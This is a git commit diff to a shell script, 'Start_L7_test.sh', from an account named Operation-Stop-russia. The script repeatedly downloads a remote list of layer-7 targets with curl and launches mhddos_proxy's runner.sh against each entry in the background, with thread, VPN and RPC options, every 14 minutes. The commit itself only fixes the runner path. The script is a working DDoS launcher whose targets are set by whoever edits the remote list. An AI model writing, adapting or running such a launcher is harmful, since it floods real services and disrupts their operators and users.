805c8a3b0cdee4f1ff82d9e364e991d5511872f1
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-06-09 02:50:16 +0300

    Update Start_L7_test.sh

--- Start_L7_test.sh
+++ Start_L7_test.sh
@@ -23,7 +23,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
-            runner.sh python3 $cmd_line $threads $vpn $rpc $debug&
+            ~/mhddos_proxy/runner.sh python3 $cmd_line $threads $vpn $rpc $debug&
       done
 sleep 14m
 done
